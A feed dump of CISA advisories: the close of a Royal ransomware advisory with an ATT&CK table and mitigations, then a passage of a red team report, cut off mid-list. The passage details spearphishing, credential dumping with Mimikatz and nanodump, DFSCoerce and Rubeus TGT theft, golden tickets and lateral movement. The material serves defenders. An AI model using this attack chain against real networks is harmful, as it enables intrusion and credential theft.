<table class="MsoTableGrid"><caption><em>Table 3: Royal Actors ATT&CK Techniques for Enterprise</em></caption>
<tbody><tr><th>
<p><strong>Initial Access</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Exploit Public Facing Application</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a></p>
</td>
<td>
<p>The actors gain initial access through public-facing applications.</p>
</td>
</tr><tr><td>
<p>Phishing: Spear phishing Attachment</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1566/001/" title="Phishing: Spear phishing Attachment">T1566.001</a></p>
</td>
<td>
<p>The actors gain initial access through malicious PDF attachments sent via email.</p>
</td>
</tr><tr><td>
<p>Phishing: Spearphishing Link</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1566/002/" title="Phishing: Spearphishing Link">T1566.002</a></p>
</td>
<td>
<p>The actors gain initial access using malvertising links via emails and public-facing sites.</p>
</td>
</tr><tr><td>
<p>External Remote Services</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1133/" title="External Remote Services">T1133</a></p>
</td>
<td>
<p>The actors gain initial access through a variety of RMM software.</p>
</td>
</tr><tr><th>
<p><strong>Command and Control</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Ingress Tool Transfer</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a></p>
</td>
<td>
<p>The actors used C2 infrastructure to download multiple tools.</p>
</td>
</tr><tr><td>
<p>Protocol Tunneling</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1572/" title="Protocol Tunneling">T1572</a></p>
</td>
<td>
<p>The actors used an encrypted SSH tunnel to communicate within C2 infrastructure.</p>
</td>
</tr><tr><th>
<p><strong>                                                              Privilege Escalation</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Valid Accounts: Domain Accounts</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/" title="Valid Accounts: Domain Accounts">T1078.002</a></p>
</td>
<td>
<p>The actors used encrypted files to create new admin user accounts.</p>
</td>
</tr><tr><th>
<p><strong>Defense Evasion</strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Impair Defenses: Disable or Modify Tools</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/" title="Impair Defenses: Disable or Modify Tools">T1562.001</a></p>
</td>
<td>
<p>The actors deactivated antivirus protocols.</p>
</td>
</tr><tr><td>
<p>Domain Policy Modification: Group Policy Modification</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1484/001/" title="Domain Policy Modification: Group Policy Modification">T1484.001</a></p>
</td>
<td>
<p>The actors modified Group Policy Objects to subvert antivirus protocols.</p>
</td>
</tr><tr><td>
<p>Indicator Removal: Clear Windows Event Logs</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1070/001/" title="Indicator Removal: Clear Windows Event Logs">T1070.001</a></p>
</td>
<td>
<p>The actors deleted shadow files and system and security logs after exfiltration.</p>
</td>
</tr><tr><td>
<p>Remote Desktop Protocol</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1021/001/" title="Remote Desktop Protocol">T1021.001</a></p>
</td>
<td>
<p>The actors used valid accounts to move laterally through the domain controller using RDP.</p>
</td>
</tr><tr><td>
<p>Automated Collection</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1119/" title="Automated Collection">T1119</a></p>
</td>
<td>
<p>The actors used registry keys to auto-extract and collect files.</p>
</td>
</tr><tr><th>
<p><strong>                                                                         Impact  </strong></p>
</th>
<th> </th>
<th> </th>
</tr><tr><td>
<p><strong>Technique Title</strong></p>
</td>
<td>
<p><strong>ID</strong></p>
</td>
<td>
<p><strong>Use</strong></p>
</td>
</tr><tr><td>
<p>Data Encrypted for Impact</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1486/" title="Data Encrypted for Impact">T1486</a></p>
</td>
<td>
<p>The actors encrypted data to determine which files were being used or blocked by other applications.</p>
</td>
</tr></tbody></table><h4><strong>MITIGATIONS</strong></h4>
<p>FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Royal ransomware. These mitigations follow <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CISA’s Cybersecurity Performance Goals (CPGs)</a>, which provide a minimum set of practices and protections that are informed by the most common and impactful threats, tactics, techniques, and procedures, and which yield goals that all organizations across critical infrastructure sectors should implement:</p>
<ul><li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 7.3</a>] in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) <strong>to comply </strong>with <a href="https://pages.nist.gov/800-63-3/" title="Digital Identity Guidelines">National Institute for Standards and Technology (NIST) standards</a> for developing and managing password policies [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.4</a>].
<ul><li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.4</a>].</li>
<li>Store passwords in hashed format using industry-recognized password managers.</li>
<li>Add password user “salts” to shared login credentials.</li>
<li>Avoid reusing passwords.</li>
<li>Implement multiple failed login attempt account lockouts [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.1</a>].</li>
<li>Disable password hints.</li>
<li>Refrain from requiring password changes more frequently than once per year. <strong>Note: </strong>NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password patterns cyber criminals can easily decipher. </li>
<li>Require administrator credentials to install software.</li>
</ul></li>
<li><strong>Require multifactor authentication </strong>[<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.3</a>] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. </li>
<li><strong>Keep all operating systems, software, and firmware up to date. </strong>Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. </li>
<li><strong>Segment networks </strong>[<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 8.1</a>]. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. </li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. </strong>To aid in detecting ransomware, implement a tool that logs and reports all network traffic [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 5.1</a>], including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. </li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software </strong>on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories </strong>for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts </strong>with administrative privileges and configure access controls according to the principle of least privilege [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.5</a>].</li>
<li><strong>Disable unused ports</strong>.</li>
<li><strong>Consider adding an email banner to emails </strong>[<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 8.3</a>] received from outside your organization.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher. </strong>For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. </li>
<li><strong>Disable command-line and scripting activities and permissions</strong>. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. </li>
<li><strong>Maintain offline backups of data, </strong>and regularly maintain backup and restoration [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 7.3</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. </li>
<li><strong>Ensure all backup data is encrypted, immutable </strong>(i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.3</a>].</li>
</ul><h4><strong>RESOURCES</strong></h4>
<ul><li><a href="https://www.stopransomware.gov/" title="#StopRansonmware">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint <a href="https://www.cisa.gov/sites/default/files/2023-01/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf" title="Ransomware Guide September 2020">Ransomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href="https://www.cisa.gov/cyber-hygiene-services" title="Cyber Hygiene Services">Cyber Hygiene Services</a> and <a href="https://github.com/cisagov/cset/releases/tag/v10.3.0.0" title="Ransomware Readiness Assessment CSET v10.3">Ransomware Readiness Assessment</a>.</li>
</ul><h4><strong>REPORTING</strong></h4>
<p>FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Royal actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details requested include: a targeted company Point of Contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, host and network based indicators.</p>
<p>FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to a <a href="https://www.fbi.gov/contact-us/field-offices" title="Field Offices">local FBI Field Office</a>, or CISA at <a href="https://www.cisa.gov/report" title="Report to CISA">https://www.cisa.gov/report</a>.</p>
<h4><strong>DISCLAIMER</strong></h4>
<p>The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.</p>
<h4><strong>REFERENCES</strong></h4>
<p>[1] <a href="https://www.cybereason.com/blog/royal-ransomware-analysis" title="Royal Rumble: Analysis of Royal Ransomware">Royal Rumble: Analysis of Royal Ransomware (cybereason.com)</a><br />
[2] <a href="https://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/" title="DEV-0569 finds new ways to deliver Royal ransomware, various payloads">DEV-0569 finds new ways to deliver Royal ransomware, various payloads - Microsoft Security Blog</a><br />
[3] <a href="https://www.cyber.gov.au/acsc/view-all-content/advisories/2023-01-acsc-ransomware-profile-royal" title="2023-01: ACSC Ransomware Profile - Royal">2023-01: ACSC Ransomware Profile - Royal | Cyber.gov.au</a></p>
<h4><strong>ACKNOWLEDGEMENTS</strong></h4>
<p>Recorded Future, Coveware, Digital Asset Redemption, Q6, and RedSense contributed to this CSA.</p>
<p>Please share your thoughts. We recently updated our anonymous <a href="https://www.surveymonkey.com/r/CISA-cyber-survey?product=%5bproduct_value%5d" title="Survey">Product Feedback</a> Survey and we'd welcome your feedback.</p>

## pubDate
Fri, 24 Feb 2023 12:30:43 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17466
## -
## title
CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a
## description
<h4><strong>SUMMARY</strong></h4>
<p><em>The Cybersecurity and Infrastructure Security Agency</em> (<em>CISA</em>) <em>is releasing this Cybersecurity Advisory</em> (<em>CSA</em>) <em>detailing activity and key findings from a recent CISA red team assessment</em>—<em>in coordination with the assessed organization</em>—<em>to provide network defenders recommendations for improving their organization's cyber posture</em>.</p>
<p><strong>Actions to take today to harden your local environment:</strong></p>
<ul><li><strong>Establish a security baseline</strong> of normal network activity; tune network and host-based appliances to detect anomalous behavior.</li>
<li><strong>Conduct regular assessments</strong> to ensure appropriate procedures are created and can be followed by security staff and end users.</li>
<li><strong>Enforce <a href="https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf" title="Implementing Phishing-Resistant MFA">phishing-resistant MFA</a></strong> to the greatest extent possible.</li>
</ul><p>In 2022, CISA conducted a red team assessment (RTA) at the request of a large critical infrastructure organization with multiple geographically separated sites. The team gained persistent access to the organization’s network, moved laterally across the organization’s multiple geographically separated sites, and eventually gained access to systems adjacent to the organization’s sensitive business systems (SBSs). Multifactor authentication (MFA) prompts prevented the team from achieving access to one SBS, and the team was unable to complete its viable plan to compromise a second SBSs within the assessment period.</p>
<p>Despite having a mature cyber posture, the organization did not detect the red team’s activity throughout the assessment, including when the team attempted to trigger a security response.</p>
<p>CISA is releasing this CSA detailing the red team’s tactics, techniques, and procedures (TTPs) and key findings to provide network defenders of critical infrastructure organizations proactive steps to reduce the threat of similar activity from malicious cyber actors. This CSA highlights the importance of collecting and monitoring logs for unusual activity as well as continuous testing and exercises to ensure your organization’s environment is not vulnerable to compromise, regardless of the maturity of its cyber posture.</p>
<p>CISA encourages critical infrastructure organizations to apply the recommendations in the Mitigations section of this CSA—including conduct regular testing within their security operations center—to ensure security processes and procedures are up to date, effective, and enable timely detection and mitigation of malicious activity.</p>
<p>Download the PDF version of this report:</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-059a-cisa_red_team_shares_key_findings_to_improve_monitoring_and_hardening_of_networks_1.pdf" class="c-file__link" target="_blank">CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks</a>
    <span class="c-file__size">(PDF,       1.06 MB
  )</span>
  </div>
</div>
<h4><strong>TECHNICAL DETAILS</strong></h4>
<p><strong>Note:</strong> This advisory uses the <a href="https://attack.mitre.org/versions/v12/matrices/enterprise/" title="Enterprise Matrix">MITRE ATT&CK® for Enterprise</a> framework, version 12. See the appendix for a table of the red team’s activity mapped to MITRE ATT&CK tactics and techniques.</p>
<h5><strong>Introduction</strong></h5>
<p>CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to Federal and non-Federal entities with respect to cybersecurity risks. (See generally 6 U.S.C. §§ 652[c][5], 659[c][6].) After receiving a request for a red team assessment (RTA) from an organization and coordinating some high-level details of the engagement with certain personnel at the organization, CISA conducted the RTA over a three-month period in 2022.</p>
<p>During RTAs, a CISA red team emulates cyber threat actors to assess an organization’s cyber detection and response capabilities. During Phase I, the red team attempts to gain and maintain persistent access to an organization’s enterprise network while avoiding detection and evading defenses. During Phase II, the red team attempts to trigger a security response from the organization’s people, processes, or technology.</p>
<p>The “victim” for this assessment was a large organization with multiple geographically separated sites throughout the United States. For this assessment, the red team’s goal during Phase I was to gain access to certain sensitive business systems (SBSs).</p>
<h5><strong>Phase I: Red Team Cyber Threat Activity</strong></h5>
<h5><em>Overview</em></h5>
<p>The organization’s network was segmented with both logical and geographical boundaries. CISA’s red team gained initial access to two organization workstations at separate sites via spearphishing emails. After gaining access and leveraging Active Directory (AD) data, the team gained persistent access to a third host via spearphishing emails. From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC). They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server. The team used this root access to move laterally to SBS-connected workstations. However, a multifactor authentication (MFA) prompt prevented the team from achieving access to one SBS, and Phase I ended before the team could implement a seemingly viable plan to achieve access to a second SBS.</p>
<h5><em>Initial Access and Active Directory Discovery</em></h5>
<p>The CISA red team gained initial access [<a href="https://attack.mitre.org/versions/v12/tactics/TA0001/" title="Initial Access">TA0001</a>] to two workstations at geographically separated sites (Site 1 and Site 2) via spearphishing emails. The team first conducted open-source research [<a href="https://attack.mitre.org/versions/v12/tactics/TA0043/" title="Reconnaissance">TA0043</a>] to identify potential targets for spearphishing. Specifically, the team looked for email addresses [<a href="https://attack.mitre.org/versions/v12/techniques/T1589/002/" title="Gather Victim Identity Information: Email Addresses">T1589.002</a>] as well as names [<a href="https://attack.mitre.org/versions/v12/techniques/T1589/003/" title="Gather Victim Identity Information: Employee Names">T1589.003</a>] that could be used to derive email addresses based on the team’s identification of the email naming scheme. The red team sent tailored spearphishing emails to seven targets using commercially available email platforms [<a href="https://attack.mitre.org/versions/v12/techniques/T1585/002/" title="Establish Accounts: Email Accounts">T1585.002</a>]. The team used the logging and tracking features of one of the platforms to analyze the organization’s email filtering defenses and confirm the emails had reached the target’s inbox.</p>
<p>The team built a rapport with some targeted individuals through emails, eventually leading these individuals to accept a virtual meeting invite. The meeting invite took them to a red team-controlled domain [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/002/" title="Phishing: Spearphishing Link">T1566.002</a>] with a button, which, when clicked, downloaded a “malicious” ISO file [<a href="https://attack.mitre.org/versions/v12/techniques/T1204/" title="User Execution">T1204</a>]. After the download, another button appeared, which, when clicked, executed the file.</p>
<p>Two of the seven targets responded to the phishing attempt, giving the red team access to a workstation at Site 1 (Workstation 1) and a workstation at Site 2. On Workstation 1, the team leveraged a modified SharpHound collector, <code>ldapsearch</code>, and command-line tool, <code>dsquery</code>, to query and scrape AD information, including AD users [<a href="https://attack.mitre.org/versions/v12/techniques/T1087/002/" title="Account Discovery: Domain Account">T1087.002</a>], computers [<a href="https://attack.mitre.org/versions/v12/techniques/T1018" title="Remote System Discovery">T1018</a>], groups [<a href="https://attack.mitre.org/versions/v12/techniques/T1069/002/" title="Permission Groups Discovery: Domain Groups">T1069.002</a>], access control lists (ACLs), organizational units (OU), and group policy objects (GPOs) [<a href="https://attack.mitre.org/versions/v12/techniques/T1615/" title="Group Policy Discovery">T1615</a>]. <strong>Note:</strong> SharpHound is a <a href="https://attack.mitre.org/versions/v12/software/S0521/" title="BloodHound">BloodHound</a> collector, an open-source AD reconnaissance tool. Bloodhound has multiple collectors that assist with information querying.</p>
<p>There were 52 hosts in the AD that had <code>Unconstrained Delegation</code> enabled and a <code>lastlogon</code> timestamp within 30 days of the query. Hosts with <code>Unconstrained Delegation</code> enabled store Kerberos ticket-granting tickets (TGTs) of all users that have authenticated to that host. Many of these hosts, including a Site 1 SharePoint server, were Windows Server 2012R2. The default configuration of Windows Server 2012R2 allows unprivileged users to query group membership of local administrator groups.</p>
<p>The red team queried parsed Bloodhound data for members of the SharePoint admin group and identified several standard user accounts with administrative access. The team initiated a second spearphishing campaign, similar to the first, to target these users. One user triggered the red team’s payload, which led to installation of a persistent beacon on the user’s workstation (Workstation 2), giving the team persistent access to Workstation 2.</p>
<h5><em>Lateral Movement, Credential Access, and Persistence</em></h5>
<p>The red team moved laterally [<a href="https://attack.mitre.org/versions/v12/tactics/TA0008/" title="Lateral Movement">TA0008</a>] from Workstation 2 to the Site 1 SharePoint server and had <code>SYSTEM</code> level access to the Site 1 SharePoint server, which had <code>Unconstrained Delegation</code> enabled. They used this access to obtain the cached credentials of all logged-in users—including the New Technology Local Area Network Manager (NTLM) hash for the SharePoint server account. To obtain the credentials, the team took a snapshot of <code>lsass.exe</code> [<a href="https://attack.mitre.org/versions/v12/techniques/T1003/001" title="OS Credential Dumping: LSASS Memory">T1003.001</a>] with a tool called <code>nanodump</code>, exported the output, and processed the output offline with <code>Mimikatz</code>.</p>
<p>The team then exploited the <code>Unconstrained Delegation</code> misconfiguration to steal the DC’s TGT. They ran the <a href="https://github.com/Wh04m1001/DFSCoerce" title="Wh04m1001 / DFSCoerce">DFSCoerce</a> python script (<code>DFSCoerce.py</code>), which prompted DC authentication to the SharePoint server using the server’s NTLM hash. The team then deployed <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> to capture the incoming DC TGT [<a href="https://attack.mitre.org/techniques/T1550/002/" title="Use Alternate Authentication Material: Pass the Hash">T1550.002</a>], [<a href="https://attack.mitre.org/versions/v12/techniques/T1557/001/" title="Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay">T1557.001</a>]. (DFSCoerce abuses Microsoft's Distributed File System [MS-DFSNM] protocol to relay authentication against an arbitrary server.[<a href="https://www.bleepingcomputer.com/news/microsoft/new-dfscoerce-ntlm-relay-attack-allows-windows-domain-takeover/" title="New DFSCoerce NTLM Relay attack allows Windows domain takeover">1</a>])</p>
<p>The team then used the TGT to harvest advanced encryption standard (AES)-256 hashes via <code>DCSync</code> [<a href="https://attack.mitre.org/versions/v12/techniques/T1003/006/" title="OS Credential Dumping: DCSync">T1003.006</a>] for the <code>krbtgt</code> account and several privileged accounts—including domain admins, workstation admins, and a system center configuration management (SCCM) service account (SCCM Account 1). The team used the <code>krbtgt</code> account hash throughout the rest of their assessment to perform golden ticket attacks [<a href="https://attack.mitre.org/versions/v12/techniques/T1558/001/" title="Steal or Forge Kerberos Tickets: Golden Ticket">T1558.001</a>] in which they forged legitimate TGTs. The team also used the <code>asktgt</code> command to impersonate accounts they had credentials for by requesting account TGTs [<a href="https://attack.mitre.org/versions/v12/techniques/T1550/003/" title="Use Alternate Authentication Material: Pass the Ticket">T1550.003</a>].</p>
<p>The team first impersonated the SCCM Account 1 and moved laterally to a Site 1 SCCM distribution point (DP) server (SCCM Server 1) that had direct network access to Workstation 2. The team then moved from SCCM Server 1 to a central SCCM server (SCCM Server 2) at a third site (Site 3). Specifically, the team:</p>
<ol><li>Queried the AD using Lightweight Directory Access Protocol (LDAP) for information about the network's sites and subnets [<a href="https://attack.mitre.org/versions/v12/techniques/T1016/" title="System Network Configuration Discovery">T1016</a>]. This query revealed all organization sites and subnets broken down by classless inter-domain routing (CIDR) subnet and description.</li>
<li>Used LDAP queries and domain name system (DNS) requests to identify recently active hosts.</li>
<li>Listed existing network connections [<a href="https://attack.mitre.org/versions/v12/techniques/T1049/" title="System Network Connections Discovery">T1049</a>] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2.</li>
<li>Attempted to move laterally to the SCCM Server 2 via <code>AppDomain</code> hijacking, but the HTTPS beacon failed to call back.</li>
<li>Attempted to move laterally with an SMB beacon [<a href="https://attack.mitre.org/versions/v12/techniques/T1021/002/" title="Remote Services: SMB/Windows Admin Shares">T1021.002</a>], which was successful.</li>
</ol><p>The team also moved from SCCM Server 1 to a Site 1 workstation (Workstation 3) that housed an active server administrator. The team impersonated an administrative service account via a golden ticket attack (from SCCM Server 1); the account had administrative privileges on Workstation 3. The user employed a KeePass password manager that the team was able to use to obtain passwords for other internal websites, a kernel-based virtual machine (KVM) server, virtual private network (VPN) endpoints, firewalls, and another KeePass database with credentials. The server administrator relied on a password manager, which stored credentials in a database file. The red team pulled the decryption key from memory using <a href="https://github.com/GhostPack/KeeThief" title="KeeThief">KeeThief</a> and used it to unlock the database [<a href="https://attack.mitre.org/versions/v12/techniques/T1555/005/" title="Credentials from Password Stores: Password Managers">T1555.005</a>].</p>
<p>At the organization’s request, the red team confirmed that SCCM Server 2 provided access to the organization’s sites because firewall rules allowed SMB traffic to SCCM servers at all other sites.</p>
<p>The team moved laterally from SCCM Server 2 to an SCCM DP server at Site 5 and from the SCCM Server 1 to hosts at two other sites (Sites 4 and 6). The team installed persistent beacons at each of these sites. Site 5 was broken into a private and a public subnet and only DCs were able to cross that boundary. To move between the subnets, the team moved through DCs. Specifically, the team moved from the Site 5 SCCM DP server to a public DC; and then they moved from the public DC to the private DC. The team was then able to move from the private DC to workstations in the private subnet.</p>
<p>The team leveraged access available from SCCM 2 to move around the organization’s network for post-exploitation activities (See Post-Exploitation Activity section).</p>
<p>See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points.</p>



<figure class="c-figure c-figure--image u-align-center" role="group"><div class="c-figure__media">    <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-03/figure_1.jpg?itok=hNji0eU-" width="1024" height="519" alt="Figure 1: Red Team Cyber Threat Activity: Initial Access and Lateral Movement" /></div>
      <figcaption class="c-figure__caption"><em>Figure 1: Red Team Cyber Threat Activity: Initial Access and Lateral Movement</em></figcaption></figure><p>While traversing the network, the team varied their lateral movement techniques to evade detection and because the organization had non-uniform firewalls between the sites and within the sites (within the sites, firewalls were configured by subnet). The team’s primary methods to move between sites were <code>AppDomainManager</code> hijacking and dynamic-link library (DLL) hijacking [<a href="https://attack.mitre.org/versions/v12/techniques/T1574/001/">T1574.001</a>]. In some instances, they used Windows Management Instrumentation (WMI) Event Subscriptions [<a href="https://attack.mitre.org/versions/v12/techniques/T1546/003/">T1546.003</a>].</p>
<p>The team impersonated several accounts to evade detection while moving. When possible, the team remotely enumerated the local administrators group on target hosts to find a valid user account. This technique relies on anonymous SMB pipe binds [<a href="https://attack.mitre.org/versions/v12/techniques/T1071/">T1071</a>], which are disabled by default starting with Windows Server 2016. In other cases, the team attempted to determine valid accounts based on group name and purpose. If the team had previously acquired the credentials, they used <code>asktgt</code> to impersonate the account. If the team did not have the credentials, they used the golden ticket attack to forge the account.</p>
<h5><em>Post-Exploitation Activity: Gaining Access to SBSs</em></h5>
<p>With persistent, deep access established across the organization’s networks and subnetworks, the red team began post-exploitation activities and attempted to access SBSs. Trusted agents of the organization tasked the team with gaining access to two specialized servers (SBS 1 and SBS 2). The team achieved root access to three SBS-adjacent workstations but was unable to move laterally to the SBS servers:</p>
<ul><li>Phase I ended before the team could implement a plan to move to SBS 1.</li>
<li>An MFA prompt blocked the team from moving to SBS 2, and Phase I ended before they could implement potential workarounds.</li>
</ul><p>However, the team assesses that by using Secure Shell (SSH) session socket files (see below), they could have accessed any hosts available to the users whose workstations were compromised.</p>
<h5><em>Plan for Potential Access to SBS 1</em></h5>
<p>Conducting open-source research [<a href="https://attack.mitre.org/versions/v12/techniques/T1591/001/" title="Gather Victim Org Information: Determine Physical Locations">1591.001</a>], the team identified that SBS 1 and 2 assets and associated management/upkeep staff were located at Sites 5 and 6, respectively. Adding previously collected AD data to this discovery, the team was able to identify a specific SBS 1 admin account. The team planned to use the organization’s mobile device management (MDM) software to move laterally to the SBS 1 administrator’s workstation and, from there, pivot to SBS 1 assets.</p>
<p>The team identified the organization’s MDM vendor using open-source and AD information [<a href="https://attack.mitre.org/versions/v12/techniques/T1590/006/" title="Gather Victim Network Information: Network Security Appliances">T1590.006</a>] and moved laterally to an MDM distribution point server at Site 5 (MDM DP 1). This server contained backups of the MDM MySQL database on its <code>D:</code> drive in the <code>Backup</code> directory. The backups included the encryption key needed to decrypt any encrypted values, such as SSH passwords [<a href="https://attack.mitre.org/versions/v12/techniques/T1552/" title="Unsecured Credentials">T1552</a>]. The database backup identified both the user of the SBS 1 administrator account (USER 2) and the user’s workstation (Workstation 4), which the MDM software remotely administered.</p>
<p>The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials [<a href="https://attack.mitre.org/versions/v12/techniques/T1552/001/" title="Unsecured Credentials: Credentials In Files">T1552.001</a>] to an application programming interface (API) user account stored in PowerShell scripts. The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page.</p>
<p>The team gained root access to workstations connected to MDM 1—specifically, the team accessed Workstation 4—by:</p>
<ol><li>Selecting an MDM user from the plaintext credentials in PowerShell scripts on MDM 1.</li>
<li>While in the MDM MySQL database,
<ul><li>Elevating the selected MDM user’s account privileges to administrator privileges, and</li>
